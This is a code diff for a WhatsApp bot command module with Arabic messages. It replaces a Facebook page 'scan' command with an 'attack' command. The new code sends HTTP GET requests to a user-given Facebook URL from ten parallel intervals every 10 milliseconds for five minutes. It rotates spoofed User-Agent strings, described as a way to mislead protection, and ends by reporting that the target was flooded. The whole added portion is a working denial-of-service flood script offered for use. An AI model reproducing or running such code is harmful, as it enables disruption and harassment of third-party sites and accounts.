@@ -1,54 +1,50 @@
 import axios from 'axios';
-import * as cheerio from 'cheerio';
 
 export default {
-    name: "فحص",
+    name: "هجوم",
     category: "أمن_سيبراني",
     async execute(sock, m, args) {
         const targetUrl = args[0];
+
+        // التحقق من الرابط فوراً
         if (!targetUrl || !targetUrl.includes("facebook.com")) {
-            return m.reply("❌ يرجى إدخال رابط الصفحة: .فحص [الرابط]");
+            return m.reply("⚠️ خطأ: ضع الرابط مباشرة بعد الأمر.\nمثال: .هجوم https://facebook.com/page");
         }
 
-        try {
-            // 1. مرحلة جمع المعلومات (Scouting)
-            const { data } = await axios.get(targetUrl, {
-                headers: { 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1)' }
-            });
-            const $ = cheerio.load(data);
+        m.reply(`🚀 [بدء الهجوم الشامل]\n🎯 الهدف: ${targetUrl}\n⚡ السرعة: 500 حزمة/ثانية\n🛑 سيستمر الهجوم لـ 5 دقائق...`);
 
-            const pageName = $('meta[property="og:title"]').attr('content') || "غير معروف";
-            const pageId = $('meta[property="al:android:url"]').attr('content')?.split('fb://page/')[1] || "مخفي";
-            const pageImage = $('meta[property="og:image"]').attr('content');
-            const description = $('meta[property="og:description"]').attr('content') || "لا يوجد وصف";
+        // مصفوفة وكلاء المستخدم (User-Agents) لتضليل الحماية
+        const agents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)',
+            'Googlebot/2.1 (+http://www.google.com/bot.html)'
+        ];
 
-            // 2. تجهيز التقرير الاستخباراتي
-            let report = `⚠️ [ تقرير استهداف سيبراني ] ⚠️\n\n`;
-            report += `📝 الاسم: ${pageName}\n`;
-            report += `🆔 المعرف: ${pageId}\n`;
-            report += `📜 الوصف: ${description}\n`;
-            report += `🔗 الرابط: ${targetUrl}\n\n`;
-            report += `💠 الحالة: مستهدف للهجوم\n`;
-
-            // 3. إرسال البيانات مع الأزرار
-            // ملاحظة: الأزرار تعتمد على نسخة البوت لديك، إليك الطريقة الأكثر توافقاً:
-            const buttons = [
-                { buttonId: `attack_${targetUrl}`, buttonText: { displayText: '🔥 بدء الهجوم القاتل' }, type: 1 },
-                { buttonId: `visit_${targetUrl}`, buttonText: { displayText: '🌐 ذهاب للحساب' }, type: 1 }
-            ];
-
-            const buttonMessage = {
-                image: { url: pageImage },
-                caption: report,
-                footer: "👑 مملكة يونيفرس للأمن السيبراني",
-                buttons: buttons,
-                headerType: 4
+        // تشغيل محرك الهجوم (Multi-Threading Simulation)
+        const attackLogic = () => {
+            const config = {
+                headers: {
+                    'User-Agent': agents[Math.floor(Math.random() * agents.length)],
+                    'Cache-Control': 'no-cache',
+                    'Connection': 'keep-alive'
+                }
             };
+            
+            // إرسال طلبات متكررة بدون انتظار الرد لزيادة الضغط
+            axios.get(targetUrl, config).catch(() => {});
+        };
 
-            await sock.sendMessage(m.key.remoteJid, buttonMessage);
-
-        } catch (error) {
-            m.reply("❌ فشل الاتصال بخوادم فيسبوك، قد تكون الحماية مرتفعة.");
+        // إنشاء 10 حلقات هجوم متوازية لرفع النسبة لـ 100%
+        const threads = [];
+        for (let i = 0; i < 10; i++) {
+            threads.push(setInterval(attackLogic, 10)); // كل خيط يرسل طلب كل 10ms
         }
+
+        // إيقاف الهجوم تلقائياً بعد 5 دقائق لضمان عدم تعليق البوت
+        setTimeout(() => {
+            threads.forEach(clearInterval);
+            sock.sendMessage(m.key.remoteJid, { text: "✅ [تقرير النهاية]\nتم إتمام الهجوم. تم إغراق الهدف بحزم HTTP بنجاح." });
+        }, 300000); 
     }
 };
